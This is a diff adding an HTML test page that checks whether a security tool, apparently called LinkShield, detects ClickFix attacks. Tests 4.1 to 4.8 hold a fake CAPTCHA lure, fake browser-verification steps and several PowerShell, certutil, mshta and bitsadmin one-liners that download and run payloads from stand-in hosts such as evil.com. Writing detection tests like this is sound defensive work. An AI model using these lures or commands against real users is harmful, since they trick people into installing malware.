@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layer 4: ClickFix/PowerShell - Detection Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .test-section h3 {
+            margin-top: 0;
+            color: #333;
+        }
+        pre, code {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 4px;
+            display: block;
+            overflow-x: auto;
+            font-size: 13px;
+        }
+        .malicious {
+            border-left: 3px solid #ff0000;
+        }
+        .legitimate {
+            border-left: 3px solid #00ff00;
+        }
+        button {
+            padding: 10px 20px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        .captcha-fake {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Layer 4: ClickFix/PowerShell Attack Detection</h1>
+    <p>Testing LinkShield's ability to detect ClickFix attacks where users are tricked into running malicious commands.</p>
+
+    <!-- Test Case 4.1: PowerShell Encoded Command -->
+    <div class="test-section malicious">
+        <h3>Test 4.1: PowerShell Encoded Command</h3>
+        <p data-test-id="4.1a" data-test-type="powershell-encoded" data-expected="true">
+            Fake CAPTCHA with malicious PowerShell:
+        </p>
+        <div class="captcha-fake">
+            <div style="font-size: 48px;">🤖</div>
+            <h3>Verify you are human</h3>
+            <p>Press <strong>Win + R</strong> and paste this verification code:</p>
+            <pre>powershell -encodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg
+AFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=</pre>
+            <button>📋 Copy Code</button>
+        </div>
+    </div>
+
+    <!-- Test Case 4.2: PowerShell Download Cradle -->
+    <div class="test-section malicious">
+        <h3>Test 4.2: PowerShell Download Cradle</h3>
+        <p data-test-id="4.2a" data-test-type="powershell-download" data-expected="true">
+            IEX/Invoke-Expression pattern:
+        </p>
+        <pre>powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"</pre>
+    </div>
+
+    <!-- Test Case 4.3: Invoke-WebRequest -->
+    <div class="test-section malicious">
+        <h3>Test 4.3: Invoke-WebRequest</h3>
+        <p data-test-id="4.3a" data-test-type="invoke-webrequest" data-expected="true">
+            Download and execute pattern:
+        </p>
+        <pre>Invoke-WebRequest -Uri "http://attacker.com/malware.exe" -OutFile "$env:TEMP\update.exe"; Start-Process "$env:TEMP\update.exe"</pre>
+    </div>
+
+    <!-- Test Case 4.4: CMD + Certutil -->
+    <div class="test-section malicious">
+        <h3>Test 4.4: CMD Certutil Download</h3>
+        <p data-test-id="4.4a" data-test-type="certutil-download" data-expected="true">
+            Certutil abuse for downloading:
+        </p>
+        <pre>cmd /c certutil -urlcache -f http://evil.com/payload.exe C:\Users\Public\update.exe && C:\Users\Public\update.exe</pre>
+    </div>
+
+    <!-- Test Case 4.5: MSHTA Attack -->
+    <div class="test-section malicious">
+        <h3>Test 4.5: MSHTA Attack</h3>
+        <p data-test-id="4.5a" data-test-type="mshta-attack" data-expected="true">
+            MSHTA for script execution:
+        </p>
+        <pre>mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"", 0:close")</pre>
+    </div>
+
+    <!-- Test Case 4.6: Bitsadmin Transfer -->
+    <div class="test-section malicious">
+        <h3>Test 4.6: Bitsadmin Transfer</h3>
+        <p data-test-id="4.6a" data-test-type="bitsadmin-download" data-expected="true">
+            BITS download abuse:
+        </p>
+        <pre>bitsadmin /transfer mydownloadjob /download /priority high http://evil.com/malware.exe C:\temp\malware.exe</pre>
+    </div>
+
+    <!-- Test Case 4.7: Fake UI Instructions -->
+    <div class="test-section malicious">
+        <h3>Test 4.7: Fake UI Instructions (Social Engineering)</h3>
+        <p data-test-id="4.7a" data-test-type="fake-ui-instructions" data-expected="true">
+            Social engineering text patterns:
+        </p>
+        <div style="background: #fff3cd; padding: 15px; border-radius: 4px;">
+            <p><strong>⚠️ Your browser needs to be verified</strong></p>
+            <ol>
+                <li>Press <strong>Windows + R</strong> to open the Run dialog</li>
+                <li>Copy the code below and paste it</li>
+                <li>Press Enter to complete verification</li>
+            </ol>
+            <p>This is required to access the content.</p>
+        </div>
+    </div>
+
+    <!-- Test Case 4.8: Copy Button Near Malicious Code -->
+    <div class="test-section malicious">
+        <h3>Test 4.8: Copy Button Near Malicious Code</h3>
+        <p data-test-id="4.8a" data-test-type="copy-button-malicious" data-expected="true">
+            Copy button proximity detection:
+        </p>
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <pre style="flex: 1;">powershell -nop -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://evil.com/backdoor.ps1'))"</pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+    </div>
+
+    <!-- Test Case 4.9: Edge Case - Legitimate PowerShell Documentation -->
+    <div class="test-section legitimate">
+        <h3>Test 4.9: Edge Case - Legitimate PowerShell Help</h3>
+        <p data-test-id="4.9a" data-test-type="legitimate-ps-help" data-expected="false">
+            This should NOT trigger (educational content):
+        </p>
+        <pre># Get help for PowerShell commands
+Get-Help Get-Process
+Get-Command -Module Microsoft.PowerShell.Management</pre>
+    </div>
+
+    <!-- Test Case 4.10: Edge Case - Legitimate Admin Script -->
+    <div class="test-section legitimate">
+        <h3>Test 4.10: Edge Case - Legitimate Admin Script</h3>
+        <p data-test-id="4.10a" data-test-type="legitimate-admin-script" data-expected="false">
+            This should NOT trigger (common admin task):
+        </p>
+        <pre># Check Windows version
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion</pre>
+    </div>
+
+    <script>
+        console.log('[Layer 4 Test] Page loaded with', document.querySelectorAll('[data-test-id]').length, 'test cases');
+
+        // Check for LinkShield detection after initialization
+        setTimeout(() => {
+            // Check if any warning was shown
+            const warningShown = document.body.getAttribute('data-linkshield-clickfix-detected') === 'true' ||
+                                document.querySelector('[id*="linkshield"][id*="warning"]') !== null;
+
+            if (warningShown) {
+                console.log('[Layer 4 Test] LinkShield detected ClickFix attack!');
+            } else {
+                console.log('[Layer 4 Test] Checking console for ClickFix detection...');
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
